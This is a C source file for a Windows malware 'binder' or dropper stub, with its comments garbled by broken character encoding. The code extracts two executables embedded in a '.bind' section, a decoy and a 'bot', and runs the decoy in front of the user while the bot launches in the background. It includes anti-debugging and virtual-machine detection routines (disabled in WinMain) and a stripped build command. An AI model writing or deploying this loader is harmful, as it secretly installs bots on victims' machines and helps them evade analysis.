#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BINDER_MAGIC 0xDEADBEEF
#define BIND_SECTION_NAME ".bind"

// Windows�汾������
#define WIN8_MAJOR_VERSION 6
#define WIN8_MINOR_VERSION 2
#define WIN10_MAJOR_VERSION 10
#define WIN11_BUILD_NUMBER 22000

// �����ݽṹ
typedef struct {
    DWORD magic;
    DWORD bot_size;
    DWORD decoy_size;
    BYTE data[1]; // �ɱ䳤������
} BindingData;

// �Զ����ַ������Ⱥ���
size_t my_strlen(const char* str) {
    size_t len = 0;
    while (str[len]) len++;
    return len;
}

// �Զ����ڴ�ȽϺ���
int my_memcmp(const void* s1, const void* s2, size_t n) {
    const unsigned char* p1 = (const unsigned char*)s1;
    const unsigned char* p2 = (const unsigned char*)s2;
    for (size_t i = 0; i < n; i++) {
        if (p1[i] != p2[i]) return p1[i] - p2[i];
    }
    return 0;
}

// ���Windows�汾������
BOOL check_windows_compatibility() {
    OSVERSIONINFOEXW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
    
    // ʹ��RtlGetVersion��ȡ��ʵ�汾��Ϣ
    typedef NTSTATUS (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    DWORD major_version = 0, minor_version = 0, build_number = 0;
    
    if (hMod) {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (RtlGetVersion) {
            RTL_OSVERSIONINFOW rovi = {0};
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (RtlGetVersion(&rovi) == 0) {
                major_version = rovi.dwMajorVersion;
                minor_version = rovi.dwMinorVersion;
                build_number = rovi.dwBuildNumber;
            }
        }
    }
    
    // ���÷���
    if (major_version == 0) {
        if (GetVersionExW((OSVERSIONINFOW*)&osvi)) {
            major_version = osvi.dwMajorVersion;
            minor_version = osvi.dwMinorVersion;
            build_number = osvi.dwBuildNumber;
        }
    }
    
    // ����Ƿ�֧��Windows 8�����ϰ汾
    if (major_version > WIN8_MAJOR_VERSION) {
        return TRUE; // Windows 10/11
    }
    
    if (major_version == WIN8_MAJOR_VERSION && minor_version >= WIN8_MINOR_VERSION) {
        return TRUE; // Windows 8/8.1
    }
    
    // ��ʾ�����Դ�����Ϣ
    WCHAR error_msg[512];
    swprintf_s(error_msg, 512, 
        L"This program requires Windows 8 or higher.\n"
        L"Current system version: %d.%d (Build %d)\n"
        L"Please upgrade your operating system.",
        major_version, minor_version, build_number);
    
    MessageBoxW(NULL, error_msg, L"System Compatibility Error", MB_ICONERROR | MB_OK);
    return FALSE;
}

// ���ϵͳ�ܹ�
BOOL check_system_architecture() {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    
    // ����Ƿ�Ϊ64λϵͳ
    BOOL is_64bit = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);
    
    if (!is_64bit) {
        MessageBoxW(NULL, 
            L"This program requires 64-bit Windows system.\n"
            L"Please run this program on 64-bit system.",
            L"Architecture Compatibility Error", 
            MB_ICONERROR | MB_OK);
        return FALSE;
    }
    
    return TRUE;
}

// ���Ұ󶨽���
PIMAGE_SECTION_HEADER find_binding_section(PVOID imageBase) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)imageBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        size_t len = my_strlen(BIND_SECTION_NAME);
        if (len > IMAGE_SIZEOF_SHORT_NAME) len = IMAGE_SIZEOF_SHORT_NAME;
        if (my_memcmp(section->Name, BIND_SECTION_NAME, len) == 0) return section;
    }
    return NULL;
}

// ִ�г��򣨼���Windows 8-11��
BOOL execute_program(BYTE* exeData, DWORD exeSize, BOOL wait_for_completion) {
    CHAR tempPath[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tempPath)) return FALSE;
    
    CHAR tempFile[MAX_PATH];
    // ʹ�ø���ȫ����ʱ�ļ�������
    DWORD tickCount = GetTickCount();
    sprintf_s(tempFile, MAX_PATH, "%stemp_%08x.exe", tempPath, tickCount);
    
    HANDLE hFile = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                               FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD written;
    if (!WriteFile(hFile, exeData, exeSize, &written, NULL) || written != exeSize) {
        CloseHandle(hFile);
        DeleteFileA(tempFile);
        return FALSE;
    }
    CloseHandle(hFile);
    
    // ִ���ļ�
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    
    // ʹ�ü򵥵Ĵ�����־ - �Ƴ�DETACHED_PROCESS����ʾ����̨
    DWORD creationFlags = CREATE_DEFAULT_ERROR_MODE;
    
    BOOL success = CreateProcessA(tempFile, NULL, NULL, NULL, FALSE, creationFlags, 
                                  NULL, NULL, &si, &pi);
    
    if (success) {
        if (wait_for_completion) {
            WaitForSingleObject(pi.hProcess, INFINITE);
        } else {
            // �����ӳ�ȷ����������
            Sleep(500);
        }
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        // �첽ɾ����ʱ�ļ�
        Sleep(1000);
        DeleteFileA(tempFile);
        return TRUE;
    }
    
    DeleteFileA(tempFile);
    return FALSE;
}

// ���PE�ļ��ܹ�
BOOL is_64bit_pe(BYTE* exeData) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)exeData;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(exeData + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    
    return (ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64);
}

// ��ִ�к���
void execute_bound_payloads() {
    PVOID imageBase = GetModuleHandle(NULL);
    PIMAGE_SECTION_HEADER section = find_binding_section(imageBase);
    if (!section) {
        return;
    }
    
    BYTE* sectionData = (BYTE*)imageBase + section->VirtualAddress;
    BindingData* binding = (BindingData*)sectionData;
    
    if (binding->magic != BINDER_MAGIC) {
        return;
    }
    
    BYTE* bot_data = binding->data;
    BYTE* decoy_data = binding->data + binding->bot_size;
    
    // ִ�в��ԣ���ִ���ն������û��ɼ�������ִ��bot����̨��
    execute_program(decoy_data, binding->decoy_size, FALSE);
    
    // �����ӳ�
    Sleep(1000);
    
    // �ں�ִ̨��bot
    execute_program(bot_data, binding->bot_size, FALSE);
}

// �����Լ��
BOOL anti_debug_check() {
    // ������������
    if (IsDebuggerPresent()) {
        return TRUE;
    }
    
    // ���Զ�̵�����
    BOOL isRemoteDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent);
    if (isRemoteDebuggerPresent) {
        return TRUE;
    }
    
    // �򻯵�NtGlobalFlag��飨����PEB�ṹ���⣩
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        // ʹ�ü򵥵ķ��������Ա�־
        DWORD* pNtGlobalFlag = (DWORD*)((BYTE*)hNtdll + 0x164);
        if (*pNtGlobalFlag & 0x70) {
            return TRUE;
        }
    }
    
    return FALSE;
}

// ������������
BOOL check_vm_environment() {
    // ��鳣��VMע�����
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
                      L"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", 
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        WCHAR value[256];
        DWORD value_size = sizeof(value);
        
        if (RegQueryValueExW(hKey, L"0", NULL, NULL, (LPBYTE)value, &value_size) == ERROR_SUCCESS) {
            if (wcsstr(value, L"VBOX") || wcsstr(value, L"VMWARE") || wcsstr(value, L"QEMU")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        
        RegCloseKey(hKey);
    }
    
    // ���CPU������
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        return TRUE;
    }
    
    // ����ڴ��С
    MEMORYSTATUSEX memStatus = {0};
    memStatus.dwLength = sizeof(memStatus);
    if (GlobalMemoryStatusEx(&memStatus)) {
        // ��������ڴ�С��2GB��������VM
        if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
            return TRUE;
        }
    }
    
    return FALSE;
}

// ��ڵ�
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // ϵͳ�����Լ��
    if (!check_windows_compatibility()) {
        return 1;
    }
    
    // �ܹ����
    if (!check_system_architecture()) {
        return 1;
    }
    
    // ��ʱ���÷����Ժ�VM����Ա����
    // if (anti_debug_check()) {
    //     return 1;
    // }
    // 
    // if (check_vm_environment()) {
    //     return 1;
    // }
    
    // ִ�а󶨵��غ�
    execute_bound_payloads();
    
    return 0;
}

// ����̨��ڵ㣨���ڵ��ԣ�
int main() {
    return WinMain(GetModuleHandle(NULL), NULL, GetCommandLineA(), SW_SHOW);
}

/*
�������� (Windows 8-11����):
x86_64-w64-mingw32-gcc prop/stubloader.c -o stubloader.exe \
-D_WIN32_WINNT=0x0602 -DUNICODE -D_UNICODE \
-ffunction-sections -fdata-sections \
-Wl,--gc-sections,--strip-all,--subsystem=windows \
-Os -flto -s -mwindows -static -static-libgcc \
-fno-ident -fno-stack-protector \
-Wno-builtin-declaration-mismatch -Wno-deprecated-declarations
*/
